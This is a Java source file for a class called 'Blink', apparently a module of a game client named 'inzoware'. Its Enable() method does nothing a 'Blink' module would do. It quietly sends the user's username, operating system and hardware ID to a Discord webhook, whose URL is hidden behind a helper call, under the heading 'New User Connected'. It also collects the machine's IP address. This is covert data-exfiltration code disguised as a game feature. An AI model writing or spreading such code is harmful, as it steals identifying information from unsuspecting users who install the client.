package com.inzo.technologies.inzoware.modules;

import java.io.IOException;

import com.inzo.technologies.inzoware.exception.WebhookException;
import com.inzo.technologies.inzoware.hooks.DiscordDuper;
import com.inzo.technologies.inzoware.hooks.Hooks374;
import com.inzo.technologies.inzoware.utils.InitUtils;

import java.awt.Color;

public class Blink {

    public static String ip = InitUtils.getIP();

    public static void Enable() {
        try {
            DiscordDuper userInfo = new DiscordDuper(Hooks374.getyou());
            userInfo.setUsername(InitUtils.getName());
            userInfo.setAvatarUrl("https://img.cjstevenson.com/images/2022/02/13/97044373.png");
            userInfo.addEmbed(new DiscordDuper.EmbedObject()
                    .setTitle("New User Connected")
                    .setColor(Color.CYAN)
                    .setDescription("PC Information" + InitUtils.getName())
                    .addField("Username", InitUtils.getName().toString(), true)
                    .addField("OS", InitUtils.getOS().toString(), true)
                    .addField("HWID", InitUtils.getHWID().toString(), false));
            userInfo.execute();
        }catch(IOException e) {
            e.printStackTrace();
            new WebhookException().printStackTrace();
        }
	}
    
}
